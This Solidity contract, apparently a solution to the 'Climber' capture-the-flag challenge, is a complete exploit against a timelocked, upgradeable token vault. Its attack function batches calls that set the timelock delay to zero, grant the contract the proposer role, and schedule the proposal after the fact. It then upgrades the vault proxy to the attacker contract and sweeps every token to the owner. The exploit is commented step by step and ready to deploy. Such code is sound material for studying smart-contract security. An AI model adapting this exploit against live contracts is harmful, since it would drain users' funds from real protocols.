// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

interface Timelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

contract ClimberAttacker is UUPSUpgradeable {
    Timelock public immutable timelock;
    address public immutable vault;
    IERC20 public immutable token;
    address public immutable owner;

    constructor(address _timelock, address _vault, address _token) {
        require(_timelock != address(0), "invalid timelock address");
        require(_vault != address(0), "invalid vault address");
        require(_token != address(0), "invalid token address");

        timelock = Timelock(_timelock);
        vault = _vault;
        token = IERC20(_token);

        owner = msg.sender;
    }

    /// Initiate the attack sequence
    /// Results in owner receiving the vault token balance
    function attack() external {
        require(msg.sender == owner, "caller is not owner");

        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements,
            bytes32 salt
        ) = _getProposal();
        timelock.execute(targets, values, dataElements, salt);
    }

    /// Schedule the proposal returned by _getProposal with the timelock
    /// Called automatically during the attack sequence
    function schedule() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements,
            bytes32 salt
        ) = _getProposal();
        timelock.schedule(targets, values, dataElements, salt);
    }

    /// Transfer this contract's token balance to the owner
    /// Called automatically during the attack sequence
    function sweepFunds() external {
        bool success = token.transfer(owner, token.balanceOf(address(this)));
        require(success, "sweep funds failed");
    }

    // Required by UUPSUpgradeable during upgradeTo calls
    function _authorizeUpgrade(address newImplementation) internal override {}

    // Exploit the ordering of timelock::execute to execute (and schedule) the following calls
    // 1. Set the timelock delay to 0
    // 2. Make this contract a timelock proposer
    // 3. Schedule this proposal with the timelock
    // 4. Upgrade the vault proxy to this contract
    // 5. Use this contract's sweepFunds implementation to transfer vault token balance to owner
    function _getProposal() private view returns(
        address[] memory,
        uint256[] memory,
        bytes[] memory,
        bytes32 
    ) {
        uint256 numElements = 5;
        
        address[] memory targets = new address[](numElements);
        targets[0] = address(timelock);             // 1.
        targets[1] = address(timelock);             // 2. 
        targets[2] = address(this);                 // 3.
        targets[3] = vault;                         // 4. 
        targets[4] = vault;                         // 5.

        uint256[] memory values = new uint256[](numElements);
        values[0] = 0;                              // 1.
        values[1] = 0;                              // 2.
        values[2] = 0;                              // 3.
        values[3] = 0;                              // 4.
        values[4] = 0;                              // 5.

        bytes[] memory dataElements = new bytes[](numElements);
        dataElements[0] = _getUpdateDelayCall();    // 1.
        dataElements[1] = _getSetupRoleCall();      // 2.
        dataElements[2] = _getScheduleCall();       // 3.
        dataElements[3] = _getUpgradeToCall();      // 4.
        dataElements[4] = _getSweepFundsCall();     // 5.

        // Any salt value will work
        bytes32 salt = 0;

        return (targets, values, dataElements, salt);
    }

    function _getUpdateDelayCall() private pure returns (bytes memory) {
        return abi.encodeWithSignature("updateDelay(uint64)", 0); 
    }

    function _getSetupRoleCall() private view returns (bytes memory) {
        bytes32 proposerRole = keccak256("PROPOSER_ROLE");
        return abi.encodeWithSignature("grantRole(bytes32,address)", proposerRole, address(this));
    }

    function _getScheduleCall() private pure returns (bytes memory) {
        return abi.encodeWithSelector(ClimberAttacker.schedule.selector);
    }

    function _getUpgradeToCall() private view returns (bytes memory) {
        return abi.encodeWithSignature("upgradeTo(address)", address(this));
    }

    function _getSweepFundsCall() private pure returns(bytes memory) {
        return abi.encodeWithSelector(ClimberAttacker.sweepFunds.selector);
    }
}
